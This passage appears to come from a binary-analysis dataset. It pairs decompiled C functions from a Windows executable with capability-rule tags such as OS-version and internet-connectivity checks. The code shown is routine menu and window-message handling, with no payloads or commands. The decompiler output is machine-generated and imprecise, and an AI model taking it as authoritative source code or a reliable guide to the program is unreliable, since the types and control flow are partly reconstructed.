            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.0043782c(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    iVar1 = fcn.00434420();\n    in_EAX[0xd] = iVar1;\n    *(iVar1 + 0x84) = in_EAX;\n    *(iVar1 + 0x80) = *(*in_EAX + 0x38);\n    *(iVar1 + 0x70) = in_EAX;\n    iVar1 = fcn.00404620();\n    in_EAX[0x11] = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x43836c;\n    *(in_EAX + 0x41) = 1;\n    fcn.0041ffc4();\n    iVar1 = in_EAX[0xd];\n    *(iVar1 + 0x3b) = 0;\n    *(iVar1 + 0x3c) = 0;\n    fcn.004387dc();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack36;\n    }\n    return in_EAX;\n}\n",
        "token_count": 357
    },
    "0043798c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.0043798c(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    if ((((*(arg_8h + -1) == '\\0') && (*(arg_8h + -8) == *(in_EAX + 0x50))) ||\n        ((*(arg_8h + -1) == '\\x01' && (*(arg_8h + -8) == *(in_EAX + 0x34))))) ||\n       ((*(arg_8h + -1) == '\\x02' && (*(arg_8h + -8) == *(in_EAX + 0x60))))) {\n        *(arg_8h + -0xc) = in_EAX;\n        var_1h._0_1_ = 1;\n    }\n    else {\n        iVar2 = fcn.004365a0();\n        if (-1 < iVar2 + -1) {\n            do {\n                arg_8h_00 = arg_8h;\n                fcn.004365b0();\n                cVar1 = fcn.0043798c(arg_8h_00);\n                if (cVar1 != '\\0') {\n                    return 1;\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    return var_1h;\n}\n",
        "token_count": 369
    },
    "00437a54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00437a54(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    char cStack20;\n    \n    uVar3 = 0;\n    cStack20 = param_1;\n    if (((cStack20 == '\\0') && (cVar1 = fcn.004047dc(),  cVar1 != '\\0')) &&\n       (iVar2 = (**(*in_EAX + 0x34))(),  param_2 == iVar2)) {\n        uVar3 = fcn.00438ff8();\n    }\n    else {\n        for (iVar2 = fcn.00437a24(); (iVar2 != 0 && (*(iVar2 + 0x54) == 0)); iVar2 = *(iVar2 + 100)) {\n        }\n        if (iVar2 != 0) {\n            uVar3 = *(iVar2 + 0x54);\n        }\n    }\n    return CONCAT44(param_1, uVar3);\n}\n",
        "token_count": 240
    },
    "00437ba8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00437ba8(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x40) == '\\0') && (*(in_EAX + 0x48) == 0)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 67
    },
    "00437dfc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nchar __cdecl fcn.00437dfc(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t **in_EAX;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStackY36;\n    uint uStackY32;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = '\\x01';\n    iVar1 = (*in_EAX)[0x19];\n    if (iVar1 != 0) {\n        uStackY32 = 0x437e2a;\n        var_1h._0_1_ = fcn.00437dfc(arg_8h);\n    }\n    if ((var_1h != '\\0') && (var_1h != '\\x03')) {\n        if (var_1h == '\\x02') {\n            if ((*(arg_8h + -4) == 0) || (*(*(arg_8h + -4) + 0x60) != *(arg_8h + -6))) {\n                uVar2 = fcn.00437a24();\n                *(arg_8h + -4) = uVar2;\n                if (*(arg_8h + -4) == 0) {\n                    return '\\x03';\n                }\n            }\n            piVar3 = fcn.00437dec();\n            *in_EAX = piVar3;\n            if (*in_EAX == NULL) {\n                return '\\x02';\n            }\n            if ((*in_EAX)[0x19] != iVar1) {\n                return '\\x02';\n            }\n            if (in_EDX == 0) {\n                var_1h._0_1_ = '\\x01';\n            }\n        }\n        if (*(*in_EAX + 0x39) == '\\0') {\n            var_1h._0_1_ = '\\0';\n        }\n        else {\n            uStackY32 = 0x437f22;\n            uStackY36 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffdc;\n            if ((*(*(arg_8h + -0xc) + 0x1c) & 0x10) == 0) {\n                fcn.00436acc();\n            }\n            (**(**in_EAX + 0x44))();\n            if ((*(arg_8h + -4) == 0) || ((*in_EAX != *(arg_8h + -4) && (*(*(arg_8h + -4) + 0x60) != *(arg_8h + -6)))))\n            {\n                var_1h._0_1_ = '\\x02';\n            }\n            *in_FS_OFFSET = uStackY36;\n        }\n    }\n    return var_1h;\n}\n",
        "token_count": 653
    },
    "00437f50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00437f50(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_14h;\n    uint var_ch;\n    uint var_6h;\n    \n    puStack36 = 0x437f64;\n    cVar1 = fcn.00437d60();\n    if (cVar1 != '\\0') {\n        return 0;\n    }\n    puStack36 = 0x437f73;\n    fcn.00437d9c();\n    puStack36 = 0x437f8d;\n    fcn.0042cdb0();\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    uStack40 = 0x438023;\n    puStack48 = 0x437fad;\n    puStack36 = &stack0xfffffffc;\n    iVar2 = fcn.00437a24();\n    if (iVar2 == 0) {\n        *in_FS_OFFSET = uStack44;\n        puStack36 = 0x43802a;\n        uStack40 = 0x438022;\n        uVar3 = fcn.0042cda8();\n        return uVar3;\n    }\n    puStack48 = 0x437fc3;\n    fcn.0042cdb0();\n    uStack52 = 0x437ff8;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    fcn.00437dfc(&stack0xfffffffc);\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x437fff;\n    uStack52 = 0x437ff7;\n    uVar3 = fcn.0042cda8();\n    return uVar3;\n}\n",
        "token_count": 451
    },
    "0043804c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043804c(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uStack152;\n    uint uStack148;\n    uint32_t uStack144;\n    uchar *puStack140;\n    uint uStack136;\n    uint uStack132;\n    uchar *puStack100;\n    uint uStack96;\n    uchar auStack88 [80];\n    \n    if ((*(*0x494d28 + 0xd) != '\\0') && (in_EAX[0xe] != 0)) {\n        puStack140 = 0x438073;\n        uVar2 = (**(*in_EAX + 0x34))();\n        uStack136 = 0x2c;\n        uStack132 = 0x10;\n        puStack100 = &stack0xffffffa8;\n        uStack96 = 0x50;\n        uStack144 = 0xffffffff;\n        uStack148 = 0;\n        uStack152 = uVar2;\n        puStack140 = &stack0xffffff78;\n        iVar3 = sub.user32.dll_GetMenuItemInfoA();\n        if (iVar3 != 0) {\n            cVar1 = fcn.004383e0();\n            if (cVar1 != '\\x01' - ((uStack144 & 0x6000) == 0)) {\n                uVar4 = fcn.004383e0();\n                uStack144 = (uVar4 & 0x7f) * 0x6000 | uStack144 & 0xffff9fff;\n                uStack148 = 0x10;\n                iVar3 = sub.user32.dll_SetMenuItemInfoA(uVar2, 0, 0xffffffff, &stack0xffffff68);\n                if (iVar3 != 0) {\n                    sub.user32.dll_DrawMenuBar(in_EAX[0xe]);\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 434
    },
    "004381b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004381b4(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uchar *arg_8h;\n    uint var_204h;\n    uint var_200h;\n    \n    arg_8h = &stack0xfffffffc;\n    if (in_EAX[0xe] != 0) {\n        (**(*in_EAX + 0x34))();\n        fcn.00438108(arg_8h);\n    }\n    if (in_EAX[0xf] != 0) {\n        fcn.004059dc();\n        iVar1 = fcn.0040a970();\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    fcn.004057a0();\n    return 1;\n}\n",
        "token_count": 174
    },
    "00438248": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00438248(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar var_6h;\n    char var_5h;\n    int32_t var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    if (*(*0x494d28 + 0xd) != '\\0') {\n        var_5h = *(in_EAX + 0x30);\n        var_6h = *(in_EAX + 0x41);\n        uStack20 = 0x4382bc;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        var_4h = in_EAX;\n        if (var_5h == '\\0') {\n            puStack16 = &stack0xfffffffc;\n            fcn.004387b8();\n        }\n        else {\n            fcn.004387b8();\n        }\n        *in_FS_OFFSET = uStack24;\n        puStack16 = 0x4382c3;\n        uStack20 = 0x4382b1;\n        fcn.004387b8();\n        *(var_4h + 0x41) = var_6h;\n        return;\n    }\n    return;\n}\n",
        "token_count": 296
    },
    "004382c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004382c8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x38) = param_2;\n    fcn.004381b4();\n    if ((*(*0x494d28 + 0xd) != '\\0') && (param_2 != 0)) {\n        if (*(in_EAX + 0x41) == '\\0') {\n            fcn.00438248();\n        }\n        else {\n            fcn.004387dc();\n        }\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "004383e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004383e0(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x494d28 + 0xd) != '\\0') && (*(in_EAX + 0x30) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 68
    },
    "00438594": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00438594(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *(param_2 + 0xc) = 0;\n    var_ch = 0xffffffff;\n    var_10h = 0xffffffff;\n    var_14h = 0xffffffff;\n    iVar3 = sub.user32.dll_GetMenuItemCount(*(param_2 + 8));\n    if (-1 < iVar3 + -1) {\n        uVar5 = 0;\n        var_18h = iVar3;\n        do {\n            uVar4 = sub.user32.dll_GetMenuState(*(param_2 + 8), uVar5, 0x400);\n            cVar2 = fcn.004383f8(*(param_2 + 4), &stack0xfffffffc);\n            uVar1 = var_10h;\n            if (cVar2 != '\\0') {\n                if ((uVar4 & 2) == 0) {\n                    if (var_ch < 0) {\n                        *(param_2 + 0xc) = 2;\n                        var_ch = uVar5;\n                    }\n                    else {\n                        *(param_2 + 0xc) = 3;\n                    }\n                    uVar1 = uVar5;\n                    if (((uVar4 & 0x80) == 0) && (uVar1 = var_10h,  -1 < var_10h)) {\n                        var_14h = uVar5;\n                    }\n                }\n                else if (var_ch < 0) {\n                    var_ch = 0xfffffffe;\n                }\n            }\n            var_10h = uVar1;\n            uVar5 = uVar5 + 1;\n            var_18h = var_18h + -1;\n        } while (var_18h != 0);\n    }\n    if (var_ch < -1) {\n        *(param_2 + 0xc) = 0x10000;\n    }\n    else {\n        if ((var_ch < 0) && (-1 < iVar3 + -1)) {\n            uVar5 = 0;\n            var_18h = iVar3;\n            do {\n                uVar4 = sub.user32.dll_GetMenuState(*(param_2 + 8), uVar5, 0x400);\n                cVar2 = fcn.00438454(*(param_2 + 4), &stack0xfffffffc);\n                uVar1 = var_10h;\n                if (cVar2 != '\\0') {\n                    if ((uVar4 & 2) != 0) {\n                        *(param_2 + 0xc) = 0x10000;\n                        return;\n                    }\n                    if (var_ch < 0) {\n                        *(param_2 + 0xc) = 2;\n                        var_ch = uVar5;\n                    }\n                    else {\n                        *(param_2 + 0xc) = 3;\n                    }\n                    uVar1 = uVar5;\n                    if (((uVar4 & 0x80) == 0) && (uVar1 = var_10h,  -1 < var_10h)) {\n                        var_14h = uVar5;\n                    }\n                }\n                var_10h = uVar1;\n                uVar5 = uVar5 + 1;\n                var_18h = var_18h + -1;\n            } while (var_18h != 0);\n        }\n        if (*(param_2 + 0xc) == 2) {\n            *(param_2 + 0xc) = var_ch | 0x20000;\n        }\n        else if (*(param_2 + 0xc) == 3) {\n            if (var_14h < 0) {\n                var_14h = var_ch;\n            }\n            *(param_2 + 0xc) = var_14h | 0x30000;\n        }\n    }\n    return;\n}\n",
        "token_count": 935
    },
    "00438710": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00438710(uint uFlags, uint cchMax, uchar *lpString)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t var_4h;\n    \n    cVar1 = fcn.00437ba8();\n    if (cVar1 == '\\0') {\n        uVar4 = sub.user32.dll_GetMenuStringA();\n    }\n    else {\n        var_4h = 0;\n        uVar2 = sub.user32.dll_GetMenuState();\n        if ((uVar2 & 0x10) == 0) {\n            iVar3 = sub.user32.dll_GetMenuItemID();\n            if (iVar3 != -1) {\n                var_4h = fcn.00437a24();\n            }\n        }\n        else {\n            sub.user32.dll_GetSubMenu();\n            var_4h = fcn.00437a24();\n        }\n        if (var_4h == 0) {\n            uVar4 = 0;\n        }\n        else {\n            *lpString = 0;\n            fcn.0040a950();\n            uVar4 = fcn.0040a868();\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 277
    },
    "004387dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004387dc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0x41) != '\\0') {\n        iVar1 = fcn.0044d2f4();\n        if (iVar1 != 0) {\n            fcn.004387b8();\n            *(in_EAX + 0x41) = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "00438804": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00438804(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x41) != '\\0') {\n        fcn.00404800();\n        fcn.004387b8();\n        *(in_EAX + 0x41) = 1;\n    }\n    return;\n}\n",
        "token_count": 75
    },
    "00438898": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00438898(uint32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x38) != 0) {\n        cVar1 = fcn.004381b4();\n        if (in_ECX == 0) {\n            sub.user32.dll_SendMessageA(*(in_EAX + 0x38), 0xb015, 0, 0);\n        }\n        if (cVar1 != '\\0') {\n            sub.user32.dll_DrawMenuBar(*(in_EAX + 0x38));\n        }\n    }\n    fcn.00438330(arg_8h & 0xff);\n    return;\n}\n",
        "token_count": 173
    },
    "004389b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004389b4(uint param_1, int32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uchar *puVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint32_t uStack104;\n    uint uStack100;\n    uchar *puStack96;\n    uint32_t uStack92;\n    uint32_t uStack88;\n    uchar *puStack84;\n    uchar *puStack80;\n    uint32_t uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_dh;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    uStack72 = 0x438ee8;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    iVar9 = *param_2;\n    if (iVar9 < 0x112) {\n        if (iVar9 == 0x111) {\n            iVar9 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar9 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x438a32;\n                    fcn.00419898();\n                    puStack80 = 0x438a3b;\n                    cVar3 = fcn.00437ac4();\n                    if (cVar3 != '\\0') goto code_r0x00438ed2;\n                    iVar9 = iVar9 + -1;\n                    puVar2 = puStack68;\n                } while (iVar9 != 0);\n            }\n        }\n        else if (iVar9 == 0x2b) {\n            iVar9 = param_2[2];\n            iVar10 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar10 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x438c46;\n                    fcn.00419898();\n                    puStack80 = 0x438c53;\n                    iVar5 = fcn.00437a24();\n                    if (iVar5 != 0) {\n                        puStack80 = 0x438c6c;\n                        fcn.00425108();\n                        puStack84 = 0x438d1b;\n                        uStack88 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffffa8;\n                        uStack92 = *(iVar9 + 0x18);\n                        puStack96 = 0x438c89;\n                        puStack80 = &stack0xfffffffc;\n                        uVar6 = sub.gdi32.dll_SaveDC();\n                        uStack100 = 0x438cfe;\n                        uStack104 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff98;\n                        puStack96 = &stack0xfffffffc;\n                        fcn.0042579c();\n                        fcn.00425630();\n                        uVar8 = *(iVar9 + 0x10);\n                        puStack112 = 0x438cd6;\n                        fcn.004391ac(uVar8);\n                        *in_FS_OFFSET = uVar8;\n                        uStack100 = 0x438d05;\n                        uStack104 = 0x438ced;\n                        fcn.0042579c();\n                        puStack112 = 0x438cfd;\n                        uStack104 = uVar6;\n                        sub.gdi32.dll_RestoreDC();\n                        return;\n                    }\n                    iVar10 = iVar10 + -1;\n                    puVar2 = puStack68;\n                } while (iVar10 != 0);\n            }\n        }\n        else if (iVar9 == 0x2c) {\n            iVar9 = param_2[2];\n            iVar10 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar10 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x438d51;\n                    fcn.00419898();\n                    puStack80 = 0x438d5e;\n                    piVar4 = fcn.00437a24();\n                    if (piVar4 != NULL) {\n                        puStack80 = *(in_EAX + 0x10);\n                        puStack84 = 0x438d77;\n                        uVar6 = sub.user32.dll_GetWindowDC();\n                        uStack88 = 0x438e5e;\n                        uStack92 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffffa4;\n                        puStack96 = 0x438d94;\n                        puStack84 = &stack0xfffffffc;\n                        fcn.00425108();\n                        uStack100 = 0x438e39;\n                        uStack104 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff98;\n                        puStack112 = 0x438dae;\n                        puStack96 = &stack0xfffffffc;\n                        uVar7 = sub.gdi32.dll_SaveDC();\n                        uStack116 = 0x438e1c;\n                        uStack120 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff88;\n                        puStack112 = &stack0xfffffffc;\n                        fcn.0042579c();\n                        fcn.00425630();\n                        uVar8 = iVar9 + 0x10;\n                        (**(*piVar4 + 0x38))();\n                        *in_FS_OFFSET = uVar8;\n                        uStack116 = 0x438e23;\n                        uStack120 = 0x438e0e;\n                        fcn.0042579c();\n                        uStack120 = uVar7;\n                        sub.gdi32.dll_RestoreDC(uVar6);\n                        return;\n                    }\n                    iVar10 = iVar10 + -1;\n                    puVar2 = puStack68;\n                } while (iVar10 != 0);\n            }\n        }\n        else if (iVar9 == 0x53) {\n            iVar9 = param_2[2];\n            iVar10 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar10 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x438b44;\n                    piVar4 = fcn.00419898();\n                    puStack80 = 0x438b49;\n                    iVar5 = (**(*piVar4 + 0x34))();\n                    if (iVar5 == *(iVar9 + 0xc)) {\n                        puStack80 = 0x438b5b;\n                        iVar5 = fcn.00419898();\n                        unique0x00007a00 = *(iVar5 + 0x34);\n                    }\n                    else {\n                        puStack80 = 0x438b6d;\n                        fcn.00419898();\n                        puStack80 = 0x438b7a;\n                        *NULL = fcn.00437a24();\n                    }\n                    if (stack0xfffffff0 != 0) {\n                        puStack80 = 0x438b91;\n                        fcn.00419898();\n                        puStack80 = 0x438b9e;\n                        iVar9 = fcn.00437a54();\n                        if (iVar9 == 0) {\n                            puStack80 = 0x438bac;\n                            fcn.00419898();\n                            puStack80 = 0x438bb9;\n                            fcn.00437a54();\n                        }\n                        if (*(**0x494cfc + 0x6c) != 0) {\n                            if ((*(*(**0x494cfc + 0x6c) + 0x270) & 8) == 0) {\n                                puStack80 = 0x438c12;\n                                fcn.00446d0c();\n                            }\n                            else {\n                                puStack80 = 0x438bff;\n                                fcn.00446d94();\n                            }\n                        }\n                        goto code_r0x00438ed2;\n                    }\n                    iVar10 = iVar10 + -1;\n                    puVar2 = puStack68;\n                } while (iVar10 != 0);\n            }\n        }\n    }\n    else if (iVar9 == 0x117) {\n        iVar9 = *(in_EAX + 8);\n        puStack68 = &stack0xfffffffc;\n        puVar2 = &stack0xfffffffc;\n        if (-1 < iVar9 + -1) {\n            do {\n                puStack68 = puVar2;\n                puStack80 = 0x438a68;\n                fcn.00419898();\n                puStack80 = 0x438a70;\n                cVar3 = fcn.00437ae0();\n                if (cVar3 != '\\0') goto code_r0x00438ed2;\n                iVar9 = iVar9 + -1;\n                puVar2 = puStack68;\n            } while (iVar9 != 0);\n        }\n    }\n    else if (iVar9 == 0x11f) {\n        uVar1 = *(param_2 + 6);\n        iVar9 = *(in_EAX + 8);\n        puStack68 = &stack0xfffffffc;\n        puVar2 = &stack0xfffffffc;\n        if (-1 < iVar9 + -1) {\n            do {\n                puStack68 = puVar2;\n                if (((uVar1 & 0x10) != 0) && (param_2[2] != 0)) {\n                    puStack80 = *(param_2 + 1);\n                    uStack88 = 0x438ab5;\n                    uStack76 = param_2[2];\n                    sub.user32.dll_GetSubMenu();\n                }\n                puStack80 = 0x438ad4;\n                fcn.00419898();\n                puStack80 = 0x438ae0;\n                iVar10 = fcn.00437a24();\n                if (iVar10 != 0) {\n                    puStack80 = 0x438af7;\n                    fcn.0044d5a8();\n                    puStack80 = 0x438b06;\n                    fcn.004470d4();\n                    goto code_r0x00438ed2;\n                }\n                iVar9 = iVar9 + -1;\n                puVar2 = puStack68;\n            } while (iVar9 != 0);\n        }\n        puStack80 = 0x438b1d;\n        fcn.004470d4();\n    }\n    else {\n        puStack68 = &stack0xfffffffc;\n        if ((iVar9 == 0x120) &&\n           (iVar9 = *(in_EAX + 8),  puStack68 = &stack0xfffffffc,  puVar2 = &stack0xfffffffc,  -1 < iVar9 + -1)) {\n            do {\n                puStack68 = puVar2;\n                puStack80 = 0x438e87;\n                piVar4 = fcn.00419898();\n                puStack80 = 0x438e92;\n                iVar10 = (**(*piVar4 + 0x34))();\n                if (iVar10 == param_2[2]) {\ncode_r0x00438ea8:\n                    puStack80 = 0x438eb2;\n                    fcn.00438594();\n                    goto code_r0x00438ed2;\n                }\n                puStack80 = 0x438ea4;\n                iVar10 = fcn.00437a24();\n                if (iVar10 != 0) goto code_r0x00438ea8;\n                iVar9 = iVar9 + -1;\n                puVar2 = puStack68;\n            } while (iVar9 != 0);\n        }\n    }\n    puStack80 = param_2[2];\n    puStack84 = param_2[1];\n    uStack88 = *param_2;\n    uStack76 = *(in_EAX + 0x10);\n    puStack96 = 0x438ecf;\n    iVar9 = sub.user32.dll_DefWindowProcA();\n    param_2[3] = iVar9;\ncode_r0x00438ed2:\n    *in_FS_OFFSET = uStack76;\n    puStack68 = 0x438eef;\n    uStack72 = 0x438ee7;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 2888
    },
    "00438ef8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
